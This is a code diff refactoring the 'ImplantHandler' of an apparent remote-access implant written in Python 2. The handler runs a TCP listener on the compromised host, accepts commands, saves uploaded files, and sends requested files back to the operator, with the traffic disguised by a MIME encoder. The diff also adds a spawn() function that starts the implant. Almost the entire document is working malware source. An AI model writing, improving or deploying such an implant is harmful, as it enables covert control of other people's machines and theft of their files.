@@ -3,10 +3,12 @@ import platform
 import SocketServer
 import sys
 
-from crispy.os_types.macintosh import Mac
-from crispy.os_types.windows import Windows
-from crispy.encoders.mime import Mime
+from .os_types.macintosh import Mac
+from .os_types.windows import Windows
+from .encoders.mime import Mime
 
+cipher = Mime()
+    
 class ImplantHandler(SocketServer.BaseRequestHandler):
     
     def handle(self):
@@ -40,46 +42,57 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
                         break 
                     else:   
                         try:
-                            f = open(saveMeFile, 'wb')
-                            while True:
-                                data = cipher.decode(self.request.recv(1024))
-                                 
-                                if not data:
-                                    break
-                                elif data == "EOF!EOF!": 
-                                    f.write(data[:-8])
-                                    break
-                                else:
-                                    f.write(data)
-                            f.close()
+                            with open(saveMeFile, 'wb') as f:
+                                receiving = True
+                                while receiving:
+                                    data = self.request.recv(1024)
+                                    if "EOF!EOF!" in data:
+                                        data = data[:-8]
+                                        receiving = False
+                                    data = cipher.decode(data)
+                                     
+                                    if not data:
+                                        break
+                                    elif  "EOF!EOF!" in data: 
+                                        f.write(data[:-8])
+                                        receiving = False
+                                    else:
+                                        f.write(data)
                         except: 
                             pass     
                 elif cmd.startswith('download') == True:
                     sendMeFile = cmd[9:].split(' ')[0]
                     
-                    f = open(sendMeFile, 'rb')
-                    while True:
-                        data = f.read(1024)
+                    with open(sendMeFile, 'rb') as f:
+                        while True:
+                            data = f.read(1024)
 
-                        if not data:
-                            break
-                        else:
-                            self.request.sendall(cipher.encode(data)) 
-                    f.close()
+                            if not data:
+                                break
+                            else:
+                                self.request.sendall(cipher.encode(data)) 
                     self.request.sendall("EOF!EOF!") 
                 else:
                     self.request.sendall(cipher.encode("unknown command\n"))
-            except: 
-                server.close_request(self.request)
-                sys.exit(1)                            
-        
-if __name__ == "__main__":
-    HOST, PORT = "localhost", 8080
-    cipher = Mime()
+            except Exception as e: 
+                print 'Uh no!', e
+                self.server.close_request(self.request)
+                sys.exit(1)
 
+def spawn(HOST="localhost", PORT=8080):
+    server = None
     try:
+        SocketServer.TCPServer.allow_reuse_address = True
         server = SocketServer.TCPServer((HOST, PORT), ImplantHandler)
         print "[+] Implant active...Terminate w/ Ctrl-C\n"
         server.serve_forever()
+    except KeyboardInterrupt:
+        server.shutdown()
     except:
         print "[!] Couldn't start server"
+    finally:
+        if server == None:
+            print 'Could not bind to socket'
+        else:
+            print 'Shutting down server'
+            server.shutdown()
